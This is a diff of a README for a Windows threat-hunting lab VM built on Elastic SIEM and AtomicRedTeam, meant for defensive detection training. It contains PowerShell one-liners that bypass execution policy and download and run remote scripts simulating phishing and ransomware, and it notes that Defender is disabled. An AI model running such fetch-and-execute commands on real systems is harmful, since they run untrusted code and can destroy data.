@@ -5,37 +5,38 @@
 
 # Elastic_Lab VM
 
-Enchance your analysis, detection and threat hunting skills in an Elastic focused enviroment. A windows 10 based VM backed with ElasticSearch and Kibana, Loaded with AtomicRedTeam to run your red team scripts.
+Enchance your analysis, detection and threat hunting skills in an Elastic focused enviroment. A windows 10 based VM backed with ElasticSearch, Kibana and Loaded with AtomicRedTeam as well as custom red team scenario scripts.
 
 ## Test, Detect and Understand
 
 ### Test
   
-Test your team on there Blue team skills, Running AtomicRedTeam scripts against the enviroment or even try hack the VM within our own network.
+Test your team on there Blue team skills, Running AtomicRedTeam scripts against the enviroment or even try hack the VM within your own network.
 
 ### Detect
   
-Utalising Elastic SIEM and Endpoint Secuirty to Detect as many TTPs by creating your own rules or implementing Elastics own rule set.
+Utalising Elastic SIEM and Endpoint Secuirty to Detect as many TTPs by creating your own custom rule set or implement Elastics own rule set.
 
 ### Understand
   
 With the Elastic agent ingesting Sysmon, Powershell, wineventlogs, Endpoint Monitoring and Network traffic logs, deep dive and conduct full analysis recognising any IOCs.  
    
-### Remember
-
-* Elastic Services can take up to 5 minutes to load.  
-* Microsoft defender is deactivated and Elastic Agent acts as the primary AV only detecting threats and not preventing them.  
-
 ### Download
 
 [Elastic_Lab.zip](https://mega.nz/file/OnhVybAJ#skZQ8ts4-PLVU_RLYg4f_YXC8iNUqWC7S3Wmcptd2u0)
   
 -------------------  
-### Start Up
+  
+### Remember
 
-Once imported into VMWare ensure you create a snapshot prior to startingthe machine. This will allow you to restart the machine from a clean state prior to further red team engagments.
+:warning: Elastic Services can take up to 5 minutes to load.  
+  
+:warning: Microsoft defender is deactivated and Elastic Agent acts as the primary AV, detecting threats not preventing them.  
+  
+:warning: Ensure you create a snapshot prior to starting the machine for the first time, allowing you to revert to a clean image prior to further red team engagments.
 
-On start up the Elastic Agent and Fleet Server need to align, sometimes it may require a manual restart.  
+:warning: On start up the Elastic Agent and Fleet Server need to align, sometimes it may require a manual restart.  
+  
 Open Kibana and search for fleet managment.  
 
 <img src="https://github.com/H0wl3r/Elastic_Lab/blob/main/Pictures/fleet_server1.png" width=75% height=75%>  
@@ -53,28 +54,23 @@ This will generate logs and alerts within Kibana.
 Depening on the scenario the powershell scripts can take from 5 - 30 minutes to execute.  
 When you what to reset the VM or clean up after the attack just select the restart snapshot.
 
-#### Phishing ####
+#### :fishing_pole_and_fish: Phishing :fishing_pole_and_fish: ####
 
 ```
 powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Scripts/Phish.ps1')"
 ```
   
-#### Ransomware ####
+#### :collision: Ransomware  :collision: ####
 
 ```
 powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Scripts/Ransom.ps1')"
 ```
   
-#### Execute all atomic red team scripts ####
+#### :see_no_evil: Execute all atomic red team scripts :see_no_evil: ####
   
 ```
 powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Scripts/AtomicRedTeam_All.ps1')"
 ```  
--------------------  
-   
-  
-
-
 -------------------  
   
 <img src="https://github.com/H0wl3r/Elastic_Lab/blob/main/Pictures/Elastic_homescreen.png" width=75% height=75%>  
